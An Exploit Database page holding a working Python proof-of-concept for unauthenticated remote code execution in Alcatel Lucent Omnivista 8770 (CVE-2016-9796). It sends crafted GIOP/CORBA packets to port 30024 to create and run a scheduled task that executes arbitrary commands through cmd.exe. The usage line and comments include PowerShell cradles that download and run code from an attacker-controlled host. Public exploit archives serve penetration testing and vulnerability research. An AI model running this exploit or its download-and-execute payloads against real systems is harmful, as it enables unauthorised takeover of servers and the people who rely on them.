* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Alcatel Lucent Omnivista 8770 - Remote Code Execution

#### EDB-ID:

###### 40862

#### CVE:

###### [2016-9796](https://nvd.nist.gov/vuln/detail/CVE-2016-9796)

---

**EDB Verified:**

#### Author:

###### [malerisch](/?author=8814)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Windows](/?platform=windows)

#### Date:

###### 2016-12-04

---

**Vulnerable App:**

```
import socket
import time
import sys
import os

# ref https://blog.malerisch.net/
# Omnivista Alcatel-Lucent running on Windows Server

if len(sys.argv) < 2:
    print "Usage: %s <target> <command>" % sys.argv[0]
    print "eg: %s 192.168.1.246 \"powershell.exe -nop -w hidden -c \$g=new-object net.webclient;IEX \$g.downloadstring('http://192.168.1.40:8080/hello');\"" % sys.argv[0]
    sys.exit(1)

target = sys.argv[1]
argument1 = ' '.join(sys.argv[2:])

# so we need to get the biosname of the target... so run this poc exploit script should be run in kali directly...

netbiosname = os.popen("nbtscan -s : "+target+" | cut -d ':' -f2").read()
netbiosname = netbiosname.strip("\n")

# dirty functions to do hex magic with bytes...
### each variable has size byte before, which includes the string + "\x00" a NULL byte
### needs to calculate for each
###

def calcsize(giop):

	s = len(giop.decode('hex'))
	h = hex(s) #"\x04" -> "04"
	return h[2:].zfill(8) # it's 4 bytes for the size

def calcstring(param): # 1 byte size calc

	s = (len(param)/2)+1
	h = hex(s)
	return h[2:].zfill(2) # assuming it is only 1 byte , again it's dirty...

def calcstring2(param):

	s = (len(param)/2)+1
	h = hex(s)
	return h[2:].zfill(4)

##

#GIOP request size is specified at the 11th byte

# 0000   47 49 4f 50 01 00 00 00 00 00 00 d8 00 00 00 00  GIOP............
# d8 is the size of GIOP REQUEST

# GIOP HEADER Is 12 bytes -
# GIOP REQUEST PAYLOAD comes after and it's defined at the 11th byte

#phase 1 - add a jobset

giopid = 1 # an arbitrary ID can be put there...

# there are checks in the size of the username.. need to find where the size is specified - anyway, 58 bytes seems all right...

usernamedata = "xxx.y.zzzzz,cn=Administrators,cn=8770 administration,o=nmc".encode('hex') # original "383737302061646d696e697374726174696f6e2c6f3d6e6d63"

#print "Size of usernamedata" + str(len(usernamedata.decode('hex')))

jobname = "MYJOB01".encode('hex') # size of 7 bytes # check also in the captured packet...

addjobset = "47494f50010000000000012600000000" + "00000001" + "01000000000000135363686564756c6572496e7465726661636500000000000a4164644a6f625365740000000000000000000008" + jobname + "00000007e0000000060000001b00000010000000240000000000000000000000000000000000000000000000000000000000000000002a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000083131313131313100010000000000000000000000000000010000000000000000000000000000003f7569643d" + usernamedata + "00000000000a6f6d6e69766973626200" # this last part can be changed???

print "Alcatel Lucent Omnivista 8770 2.0, 2.6 and 3.0 - RCE via GIOP/CORBA - @malerisch"
print "Connecting to target..."

p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
p.connect((target, 30024))

#p = remote(target, 30024, "ipv4", "tcp")

print "Adding a job..."

p.send(addjobset.decode('hex'))

#p.recv()

data = p.recv(1024)

s = len(data)

#objectkey = "" # last 16 bytes of the response!

objectkey = data[s-16:s].encode('hex')

#print objectkey

# phase 2 - active jobset

print "Sending active packet against the job"

activegiopid = 2
active = "47494f50010000000000003100000000" + "00000002" + "0100000000000010" + objectkey +  "0000000741637469766500000000000000"

#print active

p.send(active.decode('hex'))

data2 = p.recv(1024)

#print data2

# phase3 add task

addjobid = 3

print "Adding a task...."

taskname = "BBBBBBB".encode('hex')
servername = netbiosname.encode('hex')
command = "C:\Windows\System32\cmd.exe".encode('hex') #on 32bit
#command = "C:\Windows\SysWOW64\cmd.exe".encode('hex') #on 64bit
commandsize = hex((len(command.decode('hex'))+1))
commandsize = str(commandsize).replace("0x","")

#print "Command size: "+ str(commandsize)

#print command.decode('hex')

#time.sleep(10)

#powershell = str(command)
#powershell = "powershell.exe -nop -c $J=new-object net.webclient;IEX $J.downloadstring('http://192.168.1.40:8080/hello');"

#-nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring('http://10.190.127.154:8080/');

#-nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring('http://10.190.127.154:8080/');

argument = str("/c "+argument1).encode('hex')
#argument = str("/c notepad.exe").encode('hex')

#print len(argument.decode('hex'))

#argumentsize = len(str("/c "+powershell))+1

#print "Argument size: "+str(argumentsize)

argumentsize = calcstring2(argument)

#print "argument size: "+str(argumentsize)

#print argument.decode('hex')

def calcpadd(giop):
	defaultpadding = "00000000000001"
	check = giop + defaultpadding + fixedpadding
	s = len(check)
	#print "Size: "+str(s)
	if (s/2) % 4 == 0:
		#print "size ok!"
		return check
	else:
		# fix the default padding
		#print "Size not ok, recalculating padd..."
		dif = (s/2) % 4
		#print "diff: "+str(dif)
		newpadding = defaultpadding[dif*2:]
		#print "Newpadding: " +str(newpadding)
		return giop + newpadding + fixedpadding

addjobhdr = "47494f5001000000" # 8 bytes + 4 bytes for message size, including size of the giop request message

fixedpadding = "000000000000000100000000000000010000000000000002000000000000000000000000000000000000000f0000000000000000000000000000000000000002000000000000000000000000"

variablepadding = "000000000001"

#print calcstring(servername)
#print calcstring(taskname)

#print "Command:" +str(command)
#print "command size:"+str(commandsize)

addjob = "00000000000000b30100000000000010" + objectkey + "000000074164644a6f62000000000000000000" + calcstring(taskname) + taskname + "0000000001000000"+ commandsize + command  +"00000000" + calcstring(servername) + servername + "000000" + argumentsize + argument + "00"

#print addjob

addjobfin = calcpadd(addjob)

#print addjobfin.decode('hex')

addjobsize = calcsize(addjobfin)

#print "Lenght of the addjob: "+str(len(addjobfin.decode('hex')))

# we need to add the header

finalmsg = addjobhdr + addjobsize + addjobfin

p.send(finalmsg.decode('hex'))

data3 = p.recv(1024)

#print data3

# phase4 - execute task

executeid = 4

print "Executing task..."

execute = "47494f50010000000000003500000000000001100100000000000010" + objectkey + "0000000b457865637574654e6f7700000000000000"

p.send(execute.decode('hex'))

data4 = p.recv(1024)

print "All packets sent..."
print "Exploit sequence completed, command should have been executed...:-)"

p.close()

# optional requests to remove the job after the exploitation

### in metasploit, we should migrate to another process and then call an "abort" function of Omnivista

##phase5 - abort the job

canceljob = "47494f500100000000000030000000000000008e0100000000000010" + objectkey + "0000000743616e63656c000000000000"

###phase6 - delete the jobset

deletejob = "47494f500100000000000038000000000000009e0100000000000010" + objectkey + "0000000d44656c6574654a6f625365740000000000000000"

```

**Tags:**

**Advisory/Source:**
[Link](http://blog.malerisch.net/2016/12/alcatel-omnivista-8770-unauth-rce-giop-corba.html)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search


